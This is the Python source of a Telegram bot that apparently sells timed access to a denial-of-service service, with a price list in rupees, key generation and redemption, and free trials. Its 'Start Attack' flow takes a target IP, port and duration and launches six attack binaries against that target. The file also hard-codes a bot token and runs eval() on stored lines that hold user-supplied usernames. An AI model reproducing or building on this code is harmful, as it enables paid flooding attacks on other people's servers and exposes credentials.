import os #owner @Darknetdon1 FILE ME KUCHH CHENGE KIYA TO 2 BAAP KA
import telebot
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()
TOKEN = '7834211332:AAEWehgWzZJY1Z2DgMiEi7Ixv97M6Obwk9k'
bot = telebot.TeleBot(TOKEN)
OWNER_IDS = [7468235894, 6404882101, 6902791681]

KEYS_FILE = 'keys.txt'
USED_KEYS_FILE = 'used_keys.txt'
TRIAL_USERS_FILE = 'trial_users.txt'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

VALID_DURATIONS = {
    "1 hour": (10, 1/24),
    "2 hour": (20, 2/24),
    "3 hour": (30, 3/24),
    "4 hour": (40, 4/24),
    "5 hour": (50, 5/24),
    "1 day": (99, 1),
    "2 days": (149, 2),
    "3 days": (199, 3),
    "4 days": (249, 4),
    "5 days": (299, 5),
    "6 days": (349, 6),
    "7 days": (399, 7),
    "30 days": (999, 30)
}

BINARY_FILES = ['bgmi', 'naihora', 'lala', 'attack', 'smokey', 'Rahul']

async def run_attack_command_on_codespace(ip, port, duration):
    try:
        processes = []
        for binary in BINARY_FILES:
            command = f"./{binary} {ip} {port} {duration} 1300"
            process = await asyncio.create_subprocess_shell(command)
            processes.append(process)
            running_processes.append(process)
        
        # Wait for all processes to complete
        await asyncio.gather(*[process.communicate() for process in processes])
    except Exception as e:
        logging.error(f"Attack error: {e}")
    finally:
        for process in processes:
            if process in running_processes:
                running_processes.remove(process)

def is_user_approved(user_id):
    if user_id in OWNER_IDS:
        return True
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, 'r') as file:
        for line in file:
            try:
                data = eval(line.strip())
                if data['user_id'] == user_id:
                    if datetime.now() <= datetime.fromisoformat(data['valid_until']):
                        return True
            except:
                continue
    return False

def send_price_list(chat_id):
    msg = (
        "PRICE LIST👇\n"
        "⏳1 HOUR = ₹10 ✅\n"
        "⏳2 HOUR = ₹20 ✅\n"
        "⏳3 HOUR = ₹30 ✅\n"
        "⏳4 HOUR = ₹40 ✅\n"
        "⏳5 HOUR = ₹50 ✅\n"
        "⏳1 DAY  = ₹99  ✅\n"
        "⏳2 DAYS = ₹149 ✅\n"
        "⏳3 DAYS = ₹199 ✅\n"
        "⏳4 DAYS = ₹249 ✅\n"
        "⏳5 DAYS = ₹299 ✅\n"
        "⏳6 DAYS = ₹349 ✅\n"
        "⏳7 DAYS = ₹399 ✅\n"
        "⏳30 DAYS = ₹999 ✅\n\n"
        "BUY DM 👉 @Darknetdon1"
    )
    bot.send_message(chat_id, msg, parse_mode=None)

@bot.message_handler(commands=['keys'])
def handle_keys_info(message):
    if message.from_user.id not in OWNER_IDS:
        bot.send_message(message.chat.id, "Only owner can check keys info.")
        return
    
    # Count available keys
    available_keys = 0
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, 'r') as f:
            available_keys = len([line.strip() for line in f if line.strip()])
    
    # Count active and expired keys
    active_keys = 0
    expired_keys = 0
    redeemed_info = []
    
    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, 'r') as f:
            for line in f:
                try:
                    data = eval(line.strip())
                    if datetime.now() <= datetime.fromisoformat(data['valid_until']):
                        active_keys += 1
                        # Get username if available
                        try:
                            user = bot.get_chat(data['user_id'])
                            username = f"@{user.username}" if user.username else f"User ID: {data['user_id']}"
                        except:
                            username = f"User ID: {data['user_id']}"
                        redeemed_info.append(f"Key: {data['key']} - User: {username} - Valid until: {data['valid_until']}")
                    else:
                        expired_keys += 1
                except:
                    continue
    
    msg = (
        f"🔑 Keys Information:\n"
        f"Available keys: {available_keys}\n"
        f"Active keys: {active_keys}\n"
        f"Expired keys: {expired_keys}\n\n"
        f"Active Key Details:\n"
    )
    
    if redeemed_info:
        msg += "\n".join(redeemed_info)
    else:
        msg += "No active keys found."
    
    bot.send_message(message.chat.id, msg)

@bot.message_handler(commands=['clean'])
def clean_expired_keys(message):
    if message.from_user.id not in OWNER_IDS:
        bot.send_message(message.chat.id, "Only owner can clean expired keys.")
        return
    
    if not os.path.exists(USED_KEYS_FILE):
        bot.send_message(message.chat.id, "No keys to clean.")
        return
    
    active_keys = []
    expired_count = 0
    
    with open(USED_KEYS_FILE, 'r') as f:
        for line in f:
            try:
                data = eval(line.strip())
                if datetime.now() <= datetime.fromisoformat(data['valid_until']):
                    active_keys.append(line)
                else:
                    expired_count += 1
            except:
                continue
    
    with open(USED_KEYS_FILE, 'w') as f:
        f.writelines(active_keys)
    
    bot.send_message(message.chat.id, f"Cleaned {expired_count} expired keys.")

@bot.message_handler(commands=['key'])
def handle_key_generation(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "Only owner can generate keys.")
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"Use like: /key 2 hour\nValid options: {valid_keys}")
        return

    duration = args[1].lower()
    if duration not in VALID_DURATIONS:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"Invalid duration. Use one of: {valid_keys}")
        return

    price, days = VALID_DURATIONS[duration]
    key = f"{duration.replace(' ', '')}-" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))

    with open(KEYS_FILE, 'a') as f:
        f.write(f"{key}\n")

    bot.send_message(message.chat.id, f"Key generated for {duration} (₹{price}): {key}")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    bot.send_message(message.chat.id, "Send your key to activate access:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name

    if not os.path.exists(KEYS_FILE):
        bot.send_message(message.chat.id, "No keys available.")
        return

    with open(KEYS_FILE, 'r') as file:
        keys = [line.strip() for line in file]

    if key not in keys:
        bot.send_message(message.chat.id, "Invalid key.")
        return

    with open(KEYS_FILE, 'w') as file:
        for k in keys:
            if k != key:
                file.write(f"{k}\n")

    try:
        duration = key.split('-')[0]
        for valid_key in VALID_DURATIONS:
            if duration in valid_key.replace(" ", ""):
                price, days = VALID_DURATIONS[valid_key]
                break
        else:
            raise ValueError("Invalid duration")

        valid_until = (datetime.now() + timedelta(days=days)).isoformat()

        with open(USED_KEYS_FILE, 'a') as f:
            f.write(f"{{'user_id': {user_id}, 'username': '{username}', 'valid_until': '{valid_until}', 'key': '{key}'}}\n")

        bot.send_message(message.chat.id, f"Access granted for {valid_key}!")
    except Exception as e:
        logging.error(f"Redeem error: {e}")
        bot.send_message(message.chat.id, "Error processing key.")

@bot.message_handler(commands=['trial'])
def trial(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if user_id in OWNER_IDS:
        bot.send_message(message.chat.id, "You already have access.")
        return

    if os.path.exists(TRIAL_USERS_FILE):
        with open(TRIAL_USERS_FILE, 'r') as f:
            if str(user_id) in f.read():
                bot.send_message(message.chat.id, "You have already used your free trial.")
                return

    expiry = (datetime.now() + timedelta(minutes=10)).isoformat()
    with open(USED_KEYS_FILE, 'a') as f:
        f.write(f"{{'user_id': {user_id}, 'username': '{username}', 'valid_until': '{expiry}', 'key': 'trial'}}\n")
    with open(TRIAL_USERS_FILE, 'a') as f:
        f.write(f"{user_id}\n")

    bot.send_message(message.chat.id, "10-minute trial activated!")

@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 Start Attack"),
               KeyboardButton("✅ My Account"))
    markup.add(KeyboardButton("🔐🔑 Buy Key"),
               KeyboardButton("🚩 Trial"))
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    user_id = message.from_user.id
    text = message.text.strip().replace("🚀", "").replace("✅", "").replace("🔐🔑", "").replace("🚩", "").strip().lower()

    if text == "start attack":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        bot.send_message(message.chat.id, "Send IP, Port, Time:")
        bot.register_next_step_handler(message, process_attack)

    elif text == "my account":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        expiry = "Unknown"
        with open(USED_KEYS_FILE, 'r') as file:
            for line in file:
                try:
                    data = eval(line.strip())
                    if data['user_id'] == user_id:
                        expiry = data['valid_until']
                        break
                except:
                    continue
        bot.send_message(message.chat.id, f"User ID: {user_id}\nValid Until: {expiry}")

    elif text == "buy key":
        send_price_list(message.chat.id)

    elif text == "trial":
        trial(message)

    else:
        bot.send_message(message.chat.id, "Invalid option. Choose from menu.")

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "Invalid format. Use: IP PORT TIME")
            return

        ip, port, time = args[0], int(args[1]), args[2]
        if port in blocked_ports:
            bot.send_message(message.chat.id, f"Port {port} is blocked.")
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(ip, port, time), loop)
        bot.send_message(message.chat.id, f"Attack started 💥🧨\n"
                                      f"User: {message.from_user.first_name}\n"
                                      f"Host: {ip}\n"
                                      f"Port: {port}\n"
                                      f"Time: {time} seconds\n\n"
                                      f"Owner 👉 @Darknetdon1")
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(message.chat.id, "Error in attack command.")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.polling(none_stop=True)